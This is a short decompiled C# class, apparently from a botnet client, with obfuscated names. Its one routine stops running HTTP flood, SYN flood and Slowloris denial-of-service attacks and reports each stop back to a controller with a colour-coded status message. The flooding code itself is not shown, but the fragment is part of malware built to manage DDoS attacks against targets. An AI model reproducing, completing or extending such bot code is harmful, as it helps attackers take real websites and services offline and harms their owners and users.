internal sealed class Class21
{
	public static void smethod_0()
	{
		try
		{
			if (Class5.bool_0)
			{
				Class5.smethod_2();
				Class5.bool_0 = false;
				Class30.class28_0.method_3("DDos: Stopped HTTP flooding " + Class5.string_0 + "!", Class11.string_1, "brown");
			}
		}
		catch
		{
		}
		try
		{
			if (Class23.bool_0)
			{
				Class23.smethod_1();
				Class23.bool_0 = false;
				Class30.class28_0.method_3("DDos: Stopped SYN flooding " + Class23.string_0 + "!", Class11.string_1, "brown");
			}
		}
		catch
		{
		}
		try
		{
			if (Class3.bool_0)
			{
				Class3.smethod_1();
				Class30.class28_0.method_3("DDos: Stopped SLOWLORIS flooding " + Class3.string_0 + "!", Class11.string_1, "brown");
			}
		}
		catch
		{
		}
	}
}
